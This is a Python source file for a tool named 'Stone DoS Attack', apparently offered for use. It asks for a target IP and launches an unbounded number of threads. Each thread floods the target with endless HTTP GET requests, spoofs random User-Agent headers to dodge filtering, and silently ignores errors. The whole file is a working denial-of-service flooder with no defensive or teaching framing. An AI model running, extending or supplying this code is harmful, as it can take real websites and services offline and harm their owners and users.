#
#   Stone DoS Attack
#  [ Stolar Studio ]
#

ver = "0.1.3"

import threading
import requests
import os
import sys
import configparser

#threading.stack_size(64*1024)

from fake_useragent import UserAgent

if not os.path.exists("settings.txt"):
    config = configparser.ConfigParser()
    config.add_section("Settings")
    config.set("Settings", "infinity", "true")
    config.set("Settings", "UserAgent", "true")

    config.add_section("Visual")
    config.set("Visual", "print-logo", "true")
    with open("settings.txt", "w") as config_file:
        config.write(config_file)
try:
    config = configparser.ConfigParser()
    config.read("settings.txt")
    infinity = config.get("Settings", "infinity")
    User_Agent = config.get("Settings", "UserAgent")

    print_logo = config.get("Visual", "print-logo")
except:
    print("ERROR READ SETTINGS FILE")
    input("\nPress enter...")
    exit()

infinity_bool = True if infinity == 'true' or infinity == 'True' else False
User_Agent_bool = True if User_Agent == 'true' or User_Agent == 'True' else False

print_logo_bool = True if print_logo == 'true' or print_logo == 'True' else False

if print_logo_bool:
    print("""
   _____ _                     _____        _____           _   _             _    
  / ____| |                   |  __ \      / ____|     /\  | | | |           | |   
 | (___ | |_ ___  _ __   ___  | |  | | ___| (___      /  \ | |_| |_ __ _  ___| | __
  \___ \| __/ _ \| '_ \ / _ \ | |  | |/ _ \\___  \    / /\ \| __| __/ _` |/ __| |/ /
  ____) | || (_) | | | |  __/ | |__| | (_) |___) |  / ____ \ |_| || (_| | (__|   < 
 |_____/ \__\___/|_| |_|\___| |_____/ \___/_____/  /_/    \_\__|\__\__,_|\___|_|\_\                                                                                                                                                                     
""")
else:
    print("Stone DoS Attack")
print("Ver : "+ver)
print('-' * 35)

if User_Agent_bool:
    ua = UserAgent()

#print(ua.random)

addr = input("IP : ")

if not infinity_bool:
    count = input("Count Thread : ")

print('-' * 35)

def dos():
    while True:
        try:
            if User_Agent_bool:
                header = {'User-Agent':str(ua.random)}
                #htmlContent = requests.get("http://"+addr, headers=header)
                requests.get("http://"+addr, headers=header)
            else:
                requests.get("http://"+addr)
            #print(htmlContent)
        except:
            #print("ERROR")
            pass

counts = 0

if infinity_bool:
    while True:
        try:
            threading.Thread(target=dos).start()
            counts += 1
            sys.stdout.write('\r')
            sys.stdout.write("PROCESS " + str(counts) + " STARTED")
            sys.stdout.flush()
        except:
            sys.stdout.write('\n')
            print("\nALL STARTED")
            break
else:
    for i in range(int(count)):
        threading.Thread(target=dos).start()
        sys.stdout.write('\r')
        sys.stdout.write("PROCESS " + str(i+1) + " STARTED")
        sys.stdout.flush()
        
    sys.stdout.write('\n')
    print("\nALL STARTED")
        
